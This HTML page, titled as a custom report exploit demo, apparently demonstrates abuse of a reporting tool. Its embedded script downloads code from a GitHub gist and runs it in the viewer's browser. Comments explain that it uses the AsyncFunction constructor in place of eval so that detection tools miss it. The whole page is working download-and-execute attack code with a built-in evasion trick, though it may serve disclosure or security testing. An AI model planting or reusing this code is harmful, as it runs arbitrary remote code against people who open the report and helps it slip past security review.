<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Custom Report Exploit Demo</title>
  </head>

  <body>
    <div>This is a demo custom report</div>
    <script type="text/javascript">
      const AsyncFunction = Object.getPrototypeOf(
        async function () {}
      ).constructor;

      fetch(
        "https://gist.githubusercontent.com/psantos9/f92a1cd16368f63a65012cbb868b34a7/raw/1181c91b278e919516f1a8e3f9540389de18c06d/easter-egg.txt"
      )
        .then((res) => res.text())
        // we'll not use the "eval" keyword here... too obvious and easy to detect :/
        // .then((code) => eval(code));
        // instead, we'll execute arbitrary javascript code using the custom "AsyncFunction" class
        .then((code) => new AsyncFunction(code)());
    </script>
  </body>
</html>
